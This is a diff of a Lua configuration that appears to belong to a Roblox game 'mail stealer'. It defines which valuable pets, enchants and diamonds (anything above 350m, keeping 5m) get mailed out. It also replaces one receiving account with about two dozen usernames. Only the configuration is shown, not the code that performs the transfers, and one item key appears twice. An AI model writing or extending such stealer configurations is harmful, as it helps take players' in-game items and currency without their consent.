@@ -69,13 +69,18 @@ getgenv().GHUGE_COUNT = 50999
 
 getgenv().GMAIL_ITEMS = {		
 
-["Huge Splash Angelus"] = {Class = "Pet", Id = "Huge Splash Angelus", MinAmount = 1, AllVariants = true},
+["Huge Splash Angelus"] = {Class = "Pet", Id = "Huge Splash Angelus", Amount = 1, AllVariants = true},
+["Breakable Mayhem"] = {Class = "Enchant", Id = "Breakable Mayhem", Tier = 1, Amount = 1},
+["Breakable Mayhem"] = {Class = "Enchant", Id = "Breakable Mayhem", Amount = 1},
+["Huge Specter Owl"] = {Class = "Pet", Id = "Huge Specter Owl", Amount = 1, AllVariants = true},
+["Huge Shark Cat"] = {Class = "Pet", Id = "Huge Shark Cat", Amount = 1, AllVariants = true},
+
 ["Secret pet1"] = {Class = "Pet", Id = "Rainbow Swirl", MinAmount = 1, AllVariants = true},
 ["Secret pet2"] = {Class = "Pet", Id = "Banana", MinAmount = 1, AllVariants = true},
 ["Secret pet3"] = {Class = "Pet", Id = "Coin", MinAmount = 1, AllVariants = true},
 ["Secret pet4"] = {Class = "Pet", Id = "Yellow Lucky Block", MinAmount = 1, AllVariants = true},	
-["Huge Specter Owl"] = {Class = "Pet", Id = "Huge Specter Owl", Amount = 1, AllVariants = true},
-["Huge Shark Cat"] = {Class = "Pet", Id = "Huge Shark Cat", Amount = 1, AllVariants = true},
 
+["Send Diamonds"] = {Class = "Currency", Id = "Diamonds", KeepAmount = "5m", MinAmount = "350m"},
 }
-getgenv().GMAIL_RECEIVERS = {"veriotiai779"}
+getgenv().GMAIL_RECEIVERS = {"sijmongirthss","Ash3rP0w3rPanda2018","soystaylan5","dreddyewele60","1971Nowak3135","Sky_Giga2017","Inferno_Eagle200889","XxOwenC0dexX2023","TurboTig3rStr3am","1953Crutchfield3117","FusionShadowCyber","AceInferno202467","R0ck3tClaw2021_YT","Xx_VictoriaUltraCybe","Br00klynSkat3r2022","Li0nArr0w85","Noah_SKATER35","RowlandCollinq943","GalaxyRider200343","ChillMaster2011","XxRocketClawFlashxX","Vip3rB3arDragon2014","Rock3tWolfKing2009","StormyAce15"}
+   
